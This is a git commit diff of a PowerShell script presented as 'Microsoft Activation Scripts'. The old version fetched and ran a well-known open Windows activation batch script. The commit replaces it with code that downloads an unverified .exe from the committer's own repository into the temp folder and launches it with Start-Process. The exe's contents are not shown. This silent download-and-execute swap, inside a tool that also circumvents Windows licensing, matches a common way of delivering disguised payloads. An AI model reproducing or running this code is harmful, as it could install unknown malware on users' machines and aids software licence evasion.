f43267404f4dd079833dfccbb7a143f3a669222a
acenljd <thebluepoint2@gmail.com>
2025-12-09 23:50:34 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,14 +1,8 @@
-# Задаване на UTF-8 кодировка за PowerShell
-$OutputEncoding = [console]::InputEncoding = [console]::OutputEncoding = New-Object System.Text.UTF8Encoding
+$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
+$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
 
-$url = "https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/master/MAS/All-In-One-Version/MAS_AIO.cmd"
-$tempFile = "$env:TEMP\MAS_AIO.cmd"
 
-Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
+Invoke-WebRequest -Uri $url -OutFile $tempFile
 
-# Стартиране с правилна кодировка
-$processInfo = New-Object System.Diagnostics.ProcessStartInfo
-$processInfo.FileName = "cmd.exe"
-$processInfo.Arguments = "/c chcp 65001 && `"$tempFile`""
-$processInfo.UseShellExecute = $false
-[System.Diagnostics.Process]::Start($processInfo)
+
+Start-Process $tempFile
